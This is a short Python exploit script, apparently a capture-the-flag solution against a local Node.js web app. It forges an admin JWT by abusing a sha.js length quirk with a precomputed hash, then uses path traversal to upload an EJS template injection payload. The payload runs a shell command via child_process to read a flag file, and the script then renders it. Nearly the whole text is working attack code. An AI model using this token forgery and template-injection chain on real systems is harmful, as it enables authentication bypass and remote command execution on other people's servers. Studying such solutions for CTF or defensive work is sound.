import requests
import base64

URL = "http://0.0.0.0:3000"

def b64url(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode("ascii")

session = requests.Session()

header = b'{"alg":"HS256","typ":"JWT"}'
body = b'{"length":-%d,"username":"admin"}' % (len(header) + 18)
magic_hash = "674dcdbbb09261235ee8efc1999daee725dad0ec314a8d1d80cb11229e7596c1"  # получен из вызова sha.js на пустой строке
token = b64url(header) + "." + b64url(body) + "." + magic_hash
print(f"{token = }")

headers = {"Content-Type": "application/json"}
cookies = {"token": token}
ssti_payload = ssti_payload = b'''
<%
  const cp = (Function('return process'))().mainModule.require('child_process');
  const data = cp.execSync('cat /ffffffflag', 'utf8');
%>
<pre><%= data %></pre>
'''
data = {"filename": "../views/.ejs", "filedata": base64.b64encode(ssti_payload).decode()}
print(data)

r = session.post(url=f"{URL}/upload", cookies=cookies, json=data)
print(r.text)

params = {"templ": "/app/views/"}
r = session.get(url=f"{URL}", params=params, cookies=cookies)
print(r.text)